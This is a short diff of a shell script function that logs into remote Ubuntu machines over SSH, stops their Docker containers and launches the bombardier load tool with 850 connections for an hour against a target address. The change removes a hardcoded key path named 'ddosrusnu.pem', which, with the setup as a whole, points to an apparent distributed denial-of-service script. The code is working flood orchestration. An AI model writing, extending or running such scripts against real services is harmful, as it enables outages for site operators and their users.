@@ -12,7 +12,7 @@ function restartContainer {
 	echo "Command: ssh -i $pem ubuntu@$ip 'sudo docker stop \$(sudo docker ps -q)'";
 	ssh -i ${pem} ubuntu@$ip 'sudo docker stop $(sudo docker ps -q)' 2>&1 > /dev/null || true;
 	sleep 2;
-	echo "Command: ssh -i ~/Downloads/ddosrusnu.pem ubuntu@$ip 'sudo docker run -it -d --rm alpine/bombardier -c 850 -d 3600s -l ${target}'";
+	echo "Command: ssh -i $pem ubuntu@$ip 'sudo docker run -it -d --rm alpine/bombardier -c 850 -d 3600s -l ${target}'";
 	ssh -i ${pem} ubuntu@$ip "sudo docker run -it -d --rm alpine/bombardier -c 850 -d 3600s -l ${target}";
 	echo 'Done';
 }
